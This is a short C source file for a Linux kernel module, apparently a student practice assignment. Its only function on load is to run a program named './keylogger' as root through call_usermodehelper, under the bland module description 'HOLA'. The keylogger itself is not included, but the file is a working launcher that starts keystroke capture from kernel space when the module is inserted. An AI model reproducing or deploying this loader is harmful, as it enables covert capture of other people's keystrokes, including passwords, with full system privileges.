/*
Arrieta Jimenez Diana Laura
Practica20
*/

#include<linux/module.h>/**/
#include<linux/kernel.h>
#include<linux/init.h>
#define RUTA "./keylogger"

static int externo(void)
{
	char *argv[]={RUTA,NULL};
	static char *envp[]={"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL};
	return call_usermodehelper(argv[0],argv,envp,UMH_WAIT_PROC);
}
static int __init inicio(void)
{
	return externo();
}

static void __exit fin(void)
{
	printk(KERN_INFO "Terminado \n");
}

module_init(inicio);
module_exit(fin);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("DIANA");
MODULE_DESCRIPTION("HOLA");
